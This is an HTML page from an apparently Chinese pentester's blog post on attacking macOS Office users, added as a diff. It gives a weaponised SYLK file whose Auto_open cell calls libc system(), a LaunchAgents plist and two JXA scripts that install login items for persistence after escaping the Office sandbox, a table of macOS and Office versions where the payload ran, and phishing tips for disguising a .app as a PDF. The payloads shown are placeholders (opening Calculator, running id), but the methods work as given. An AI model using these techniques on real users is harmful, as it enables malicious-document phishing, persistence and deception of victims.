@@ -1,0 +1,968 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Macos office攻防 office钓鱼 macos macos钓鱼 office沙箱 宏攻击 SYLK攻击,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Macos Office攻防转载请注明出处：https://youngrichog.github.io/ (本文还没有写完，施工中👷‍♀️👷) 描述最近看了看Macos下的攻防视角都有什么，之前的话有做过AppleScript，在mac &amp;lt;10.15还是屡试不爽的，舒服至极。但是针对于&amp;gt;10.15版本，好像自己没有什么积累，索性就开始研究研究，主要涉及到SYLK利用、权限维持、沙箱">
+<meta name="keywords" content="Macos office攻防 office钓鱼 macos macos钓鱼 office沙箱 宏攻击 SYLK攻击">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Macos Office攻防">
+<meta property="og:url" content="http://yoursite.com/2021/06/16/Macos-Office攻防/index.html">
+<meta property="og:site_name" content="YoungRichOG">
+<meta property="og:description" content="Macos Office攻防转载请注明出处：https://youngrichog.github.io/ (本文还没有写完，施工中👷‍♀️👷) 描述最近看了看Macos下的攻防视角都有什么，之前的话有做过AppleScript，在mac &amp;lt;10.15还是屡试不爽的，舒服至极。但是针对于&amp;gt;10.15版本，好像自己没有什么积累，索性就开始研究研究，主要涉及到SYLK利用、权限维持、沙箱">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2021-06-19T16:31:05.963Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Macos Office攻防">
+<meta name="twitter:description" content="Macos Office攻防转载请注明出处：https://youngrichog.github.io/ (本文还没有写完，施工中👷‍♀️👷) 描述最近看了看Macos下的攻防视角都有什么，之前的话有做过AppleScript，在mac &amp;lt;10.15还是屡试不爽的，舒服至极。但是针对于&amp;gt;10.15版本，好像自己没有什么积累，索性就开始研究研究，主要涉及到SYLK利用、权限维持、沙箱">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/06/16/Macos-Office攻防/">
+
+
+
+
+
+  <title>Macos Office攻防 | YoungRichOG</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">YoungRichOG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">Web Pentester</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/06/16/Macos-Office攻防/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YoungRichOG">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YoungRichOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">Macos Office攻防</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-06-16T23:32:29+08:00">
+                2021-06-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Macos-Office攻防"><a href="#Macos-Office攻防" class="headerlink" title="Macos Office攻防"></a>Macos Office攻防</h1><p><strong><del>转载请注明出处：<a href="https://youngrichog.github.io/" target="_blank" rel="noopener">https://youngrichog.github.io/</a></del></strong></p>
+<p>(本文还没有写完，施工中👷‍♀️👷)</p>
+<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>最近看了看Macos下的攻防视角都有什么，之前的话有做过AppleScript，在mac &lt;10.15还是屡试不爽的，舒服至极。但是针对于&gt;10.15版本，好像自己没有什么积累，索性就开始研究研究，主要涉及到SYLK利用、权限维持、沙箱跳出等。</p>
+<p>什么是SYLK？</p>
+<blockquote>
+<p>SYLK 代表 SYmbolic LinkK，一种于 1980 年代引入的文件格式。通常，SYLK 文件的文件扩展名为 .slk。SYLK 是一种仅使用可显示的 ANSI 字符的文件格式，创建它是为了在应用程序（例如电子表格和数据库）之间交换数据。</p>
+<p>尽管是一种古老的文件格式，但文件扩展名 .slk 在最新的 MS Office 版本（在 2010、2013 、2016和2019）仍然默认映射到 Excel。</p>
+</blockquote>
+<p>说说SYLK的优点？</p>
+<blockquote>
+<p>SYLK 格式吸引攻击者的一个重要原因是：<a href="https://support.office.com/en-us/article/what-is-protected-view-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653" target="_blank" rel="noopener">受保护的视图沙箱</a>不适用于这种文件格式。这意味着，如果武器化 SYLK 文件是通过电子邮件或 Web 传送的，并且应用了<a href="https://textslashplain.com/2016/04/04/downloads-and-the-mark-of-the-web/" target="_blank" rel="noopener">Web 标记标记</a>，则目标用户不会被此警告消息打扰。</p>
+<p>此外，扩展名为 .slk 的 SYLK 文件具有以下特征。</p>
+<ul>
+<li>SYLK 不包括在<a href="https://support.office.com/en-us/article/blocked-attachments-in-outlook-434752e1-02d3-4e90-9124-8b81e49a8519" target="_blank" rel="noopener">MS Outlook 阻止的附件列表中</a>。</li>
+<li>SYLK 不包括在<a href="https://www.zdnet.com/article/microsoft-bans-38-file-extensions-in-outlook-for-the-web/" target="_blank" rel="noopener">默认的 OWA 阻止扩展列表中</a>。</li>
+<li>SYLK 在<a href="https://cs.chromium.org/chromium/src/chrome/browser/resources/safe_browsing/download_file_types.asciipb" target="_blank" rel="noopener">Chrome 的安全浏览文件类型列表中</a>未标记为危险。</li>
+</ul>
+</blockquote>
+<p>嗯，的确是一个武器化的理想选择。简单点说SYLK就是一个old school，可以兼容新版Office，并且不在大众的视野里。</p>
+<a id="more"></a>
+<h2 id="SYLK利用"><a href="#SYLK利用" class="headerlink" title="SYLK利用"></a>SYLK利用</h2><p>xxxx.slk</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ID;P</span><br><span class="line">O;E</span><br><span class="line">NN;NAuto_open;ER101C1;KOut Flank;F</span><br><span class="line">C;X1;Y101;K0;ECALL(&quot;libc.dylib&quot;,&quot;system&quot;,&quot;JC&quot;,&quot;open -a Calculator&quot;)</span><br><span class="line">C;X1;Y102;K0;EHALT()</span><br><span class="line">E</span><br></pre></td></tr></table></figure>
+<h2 id="沙箱跳出"><a href="#沙箱跳出" class="headerlink" title="沙箱跳出"></a>沙箱跳出</h2><p>这部分我主要关注了2个版本的office：2016和2019，貌似现在2016也用的很少了，2016和2019沙箱的跳出姿势也有不同。相同点是可以将~$开头的文件写到沙箱以外的其他目录，可以看出这样开头的文件是office的临时文件。当然从另一个角度看，我们还可以结合一些软件本身的机制挖掘沙箱跳出，例如某些软件在启动的时候、定期会从某些特定目录拉取文件进行执行，另外我在YY一个思路，如同Windows下的DLL劫持，Macos上也是有的。</p>
+<p>2016版本与2019版本对比</p>
+<p>补图</p>
+<p>2016版本对LaunchAgents是具有写权限的，在2019版本已经被patch掉了</p>
+<p>2016沙箱跳出姿势：</p>
+<ul>
+<li>直接写~$xxxxx.plist到LaunchAgents启动项</li>
+<li>利用LoginItems登陆项</li>
+</ul>
+<p>2019沙箱跳出姿势：</p>
+<ul>
+<li>利用LoginItems登陆项</li>
+</ul>
+<p>直接写~$xxxxx.plist到LaunchAgents启动项，这里就不多提了，附一个plist</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>Label<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>YoungRichOG<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>-c id<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用LoginItems登陆项进行沙箱跳出，等目标下次重新登陆的时候触发。</p>
+<p>添加全局登陆项(kLSSharedFileListGlobalLoginItems)：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loginitems</span>(<span class="params">params</span>)</span>&#123;</span><br><span class="line">	ObjC.import(<span class="string">'CoreServices'</span>);</span><br><span class="line">	ObjC.import(<span class="string">'Security'</span>);</span><br><span class="line">	ObjC.import(<span class="string">'SystemConfiguration'</span>);</span><br><span class="line">	<span class="keyword">let</span> args = <span class="built_in">JSON</span>.parse(params);</span><br><span class="line">	<span class="built_in">console</span>.log(args.path)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">let</span> auth;</span><br><span class="line">	<span class="keyword">let</span> result = $.AuthorizationCreate($.nil, $.nil, $.kAuthorizationDefaults, Ref(auth));</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (result === <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">let</span> temp = $.CFURLCreateFromFileSystemRepresentation($.kCFAllocatorDefault, args[<span class="string">'path'</span>], args[<span class="string">'path'</span>].length, <span class="literal">false</span>);</span><br><span class="line">		<span class="keyword">let</span> items = $.LSSharedFileListCreate($.kCFAllocatorDefault, $.kLSSharedFileListGlobalLoginItems, $.nil);</span><br><span class="line">		$.LSSharedFileListSetAuthorization(items, auth);</span><br><span class="line">		<span class="keyword">let</span> cfName = $.CFStringCreateWithCString($.nil, args[<span class="string">'name'</span>], $.kCFStringEncodingASCII);</span><br><span class="line">		<span class="keyword">let</span> itemRef = $.LSSharedFileListInsertItemURL(items, $.kLSSharedFileListItemLast, cfName, $.nil, temp, $.nil, $.nil);</span><br><span class="line">		<span class="keyword">return</span> &#123;<span class="string">"user_output"</span>: <span class="string">"LoginItem installation successful"</span>, <span class="string">"completed"</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> &#123;<span class="string">"user_output"</span>: <span class="string">`LoginItem installation failed: AuthorizationCreate returned <span class="subst">$&#123;result&#125;</span>`</span>, <span class="string">"completed"</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">params = <span class="string">"&#123;\"name\": \"YoungRichOG\", \"path\":\"/tmp/xxxxxxxxxxxx\"&#125;"</span>;</span><br><span class="line">loginitems(params)</span><br></pre></td></tr></table></figure>
+<p>给当前用户添加登陆项(kLSSharedFileListSessionLoginItems)：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loginitem</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    ObjC.import(<span class="string">'CoreServices'</span>);</span><br><span class="line">    ObjC.import(<span class="string">'Security'</span>);</span><br><span class="line">    ObjC.import(<span class="string">'SystemConfiguration'</span>);</span><br><span class="line">    <span class="keyword">let</span> auth;</span><br><span class="line">    <span class="keyword">let</span> result = $.AuthorizationCreate($.nil, $.nil, $.kAuthorizationDefaults, Ref(auth));</span><br><span class="line">    <span class="keyword">if</span> (result === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> temp = $.CFURLCreateFromFileSystemRepresentation($.kCFAllocatorDefault, <span class="string">'/Applications/Safari.app/Contents/MacOS/Safari'</span>, <span class="string">'/Applications/Safari.app/Contents/MacOS/Safari'</span>.length, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">let</span> items = $.LSSharedFileListCreate($.kCFAllocatorDefault, $.kLSSharedFileListSessionLoginItems, $.nil);</span><br><span class="line">        $.LSSharedFileListSetAuthorization(items, auth);</span><br><span class="line">        <span class="keyword">let</span> cfName = $.CFStringCreateWithCString($.nil, <span class="string">'WebTest'</span>, $.kCFStringEncodingASCII);</span><br><span class="line">        <span class="keyword">let</span> itemRef = $.LSSharedFileListInsertItemURL(items, $.kLSSharedFileListItemLast, cfName, $.nil, temp, $.nil, $.nil);</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">"user_output"</span>: <span class="string">"LoginItem installation successful"</span>, <span class="string">"completed"</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">"user_output"</span>: <span class="string">`LoginItem installation failed: AuthorizationCreate returned <span class="subst">$&#123;result&#125;</span>`</span>, <span class="string">"completed"</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">loginitem()</span><br></pre></td></tr></table></figure>
+<p>利用LoginItems登陆项做沙箱跳出，如果直接指定某二进制文件，</p>
+<h2 id="测试数据"><a href="#测试数据" class="headerlink" title="测试数据"></a>测试数据</h2><p>附一些自己的测试数据，如果从提高成功来看，分为：低系统版本+office或高系统版本+低office版本</p>
+<table>
+<thead>
+<tr>
+<th>系统版本</th>
+<th>office版本</th>
+<th>安全设置(自行)</th>
+<th>安全设置(默认)</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>10.14.5</td>
+<td>16.18(181014)</td>
+<td></td>
+<td></td>
+<td>成功</td>
+</tr>
+<tr>
+<td>10.12.4</td>
+<td>16.30(19101301)</td>
+<td>禁用所有宏，并且不通知</td>
+<td></td>
+<td>成功</td>
+</tr>
+<tr>
+<td>10.14.5</td>
+<td>16.37(20051002)</td>
+<td></td>
+<td></td>
+<td>失败</td>
+</tr>
+<tr>
+<td>10.14.5</td>
+<td>16.39(20071300)</td>
+<td></td>
+<td></td>
+<td>失败</td>
+</tr>
+<tr>
+<td>10.14.5</td>
+<td>16.46(21021202)</td>
+<td></td>
+<td></td>
+<td>失败</td>
+</tr>
+<tr>
+<td>10.14.5</td>
+<td>16.48(21041102)</td>
+<td></td>
+<td></td>
+<td>失败</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>10.15.5</td>
+<td>16.48(21041102)</td>
+<td></td>
+<td></td>
+<td>失败</td>
+</tr>
+<tr>
+<td>10.15.7</td>
+<td>16.48(21041102)</td>
+<td>禁用所有宏，并发出通知</td>
+<td></td>
+<td>会弹宏，点击启用成功弹出</td>
+</tr>
+<tr>
+<td>10.15.7</td>
+<td>16.48(21041102)</td>
+<td>禁用所有宏，并且不通知</td>
+<td></td>
+<td>失败</td>
+</tr>
+<tr>
+<td>10.15.7</td>
+<td>16.42(20101102)</td>
+<td>禁用所有宏，并发出通知</td>
+<td></td>
+<td>会弹宏，点击启用成功弹出</td>
+</tr>
+<tr>
+<td>10.15.7</td>
+<td>16.42(20101102)</td>
+<td>禁用所有宏，并且不通知</td>
+<td></td>
+<td>失败</td>
+</tr>
+<tr>
+<td>10.15.7</td>
+<td>16.18(181208)</td>
+<td>禁用所有宏，并且不通知</td>
+<td></td>
+<td>成功</td>
+</tr>
+<tr>
+<td>10.15.7</td>
+<td>16.18(181208)</td>
+<td>禁用所有宏，并发出通知</td>
+<td></td>
+<td>会弹宏，点击启用成功弹出</td>
+</tr>
+<tr>
+<td>10.12.6</td>
+<td>16.30(19101301)</td>
+<td>禁用所有宏，并发出通知</td>
+<td></td>
+<td>会弹宏，点击启用成功弹出</td>
+</tr>
+<tr>
+<td>10.12.6</td>
+<td>16.30(19101301)</td>
+<td>禁用所有宏，并且不通知</td>
+<td></td>
+<td>成功</td>
+</tr>
+<tr>
+<td>10.12.6</td>
+<td>16.29(19090802)</td>
+<td>禁用所有宏，并发出通知</td>
+<td></td>
+<td>会弹宏，点击启用成功弹出</td>
+</tr>
+<tr>
+<td>10.12.6</td>
+<td>16.29(19090802)</td>
+<td>禁用所有宏，并且不通知</td>
+<td></td>
+<td>成功</td>
+</tr>
+<tr>
+<td>10.12.6</td>
+<td>16.27(19071500)</td>
+<td>禁用所有宏，并发出通知</td>
+<td></td>
+<td>会弹宏，点击启用成功弹出</td>
+</tr>
+<tr>
+<td>10.12.6</td>
+<td>16.27(19071500)</td>
+<td>禁用所有宏，并且不通知</td>
+<td></td>
+<td>成功</td>
+</tr>
+<tr>
+<td>10.12.6</td>
+<td>16.24(19041401)</td>
+<td>禁用所有宏，并发出通知</td>
+<td></td>
+<td>会弹宏，点击启用成功弹出</td>
+</tr>
+<tr>
+<td>10.12.6</td>
+<td>16.24(19041401)</td>
+<td>禁用所有宏，并且不通知</td>
+<td></td>
+<td>成功</td>
+</tr>
+<tr>
+<td>10.12.6</td>
+<td>16.22(190211)</td>
+<td>禁用所有宏，并发出通知</td>
+<td></td>
+<td>会弹宏，点击启用成功弹出</td>
+</tr>
+<tr>
+<td>10.12.6</td>
+<td>16.22(190211)</td>
+<td>禁用所有宏，并且不通知</td>
+<td></td>
+<td>成功</td>
+</tr>
+<tr>
+<td>10.12.6</td>
+<td>16.20(181208)</td>
+<td>禁用所有宏，并发出通知</td>
+<td></td>
+<td>会弹宏，点击启用成功弹出</td>
+</tr>
+<tr>
+<td>10.12.6</td>
+<td>16.20(181208)</td>
+<td>禁用所有宏，并且不通知</td>
+<td></td>
+<td>成功</td>
+</tr>
+<tr>
+<td>10.12.6</td>
+<td>16.19(181109)</td>
+<td>禁用所有宏，并发出通知</td>
+<td></td>
+<td>会弹宏，点击启用成功弹出</td>
+</tr>
+<tr>
+<td>10.12.6</td>
+<td>16.19(181109)</td>
+<td>禁用所有宏，并且不通知</td>
+<td></td>
+<td>成功</td>
+</tr>
+<tr>
+<td>10.12.6</td>
+<td>16.18(181014)</td>
+<td>禁用所有宏，并发出通知</td>
+<td></td>
+<td>会弹宏，点击启用成功弹出</td>
+</tr>
+<tr>
+<td>10.12.6</td>
+<td>16.18(181014)</td>
+<td>禁用所有宏，并且不通知</td>
+<td></td>
+<td>成功</td>
+</tr>
+</tbody>
+</table>
+<p>office安装的其他情况：</p>
+<p>16.48不支持10.12.6，支持10.14.0往后版本</p>
+<p>16.39不支持10.12.6，支持10.13.0往后版本</p>
+<p>16.34不支持10.12.6，支持10.13.0往后版本</p>
+<p>16.32不支持10.12.6，支持10.13.0往后版本</p>
+<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>在Macos10.14.5通过LSSharedFileListInsertItemURL实现LoginItems登陆项异常退出，目前还没有找到原因 :-(</p>
+<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p><strong>1.利用宏进行钓鱼攻击，高版本office都会运行在沙盒中，所以我们要考虑沙箱跳出</strong></p>
+<p><strong>2.office沙箱环境目录:/Users/Current User/Library/Containers/com.microsoft.Excel/Data/，其中拿Excel举例</strong></p>
+<p><strong>3.office临时文件目录，echo $TMPDIR，每当打开excel文件或其他，都会有对应临时文件</strong></p>
+<p><strong>4.钓鱼姿势，适用于各类Macos钓鱼场景，当时在绕过AppleScript显示app为后缀，在macos10.15后，失效了一部分姿势，例如：Mac在键盘处加入Unicode，然后输入的时候用option+Unicode编号就可以了，例如d为option + 217e 使用Unicode可以绕过文件显示app的情况。重点来了在高版本的macos，可以这样绕过：1.pdf..app 显示1.pdf.</strong></p>
+<h2 id="Respect"><a href="#Respect" class="headerlink" title="Respect"></a>Respect</h2><p><a href="https://outflank.nl/blog/2019/10/30/abusing-the-sylk-file-format/" target="_blank" rel="noopener">https://outflank.nl/blog/2019/10/30/abusing-the-sylk-file-format/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Macos-office攻防-office钓鱼-macos-macos钓鱼-office沙箱-宏攻击-SYLK攻击/" rel="tag"># Macos office攻防 office钓鱼 macos macos钓鱼 office沙箱 宏攻击 SYLK攻击</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/06/16/sqlmap-fresh-queries小记/" rel="next" title="sqlmap --fresh-queries小记">
+                <i class="fa fa-chevron-left"></i> sqlmap --fresh-queries小记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/07/03/BurpSuite技巧大全/" rel="prev" title="BurpSuite技巧大全">
+                BurpSuite技巧大全 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">YoungRichOG</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Macos-Office攻防"><span class="nav-number">1.</span> <span class="nav-text">Macos Office攻防</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#描述"><span class="nav-number">1.1.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SYLK利用"><span class="nav-number">1.2.</span> <span class="nav-text">SYLK利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#沙箱跳出"><span class="nav-number">1.3.</span> <span class="nav-text">沙箱跳出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试数据"><span class="nav-number">1.4.</span> <span class="nav-text">测试数据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#遇到的问题"><span class="nav-number">1.5.</span> <span class="nav-text">遇到的问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tips"><span class="nav-number">1.6.</span> <span class="nav-text">Tips</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 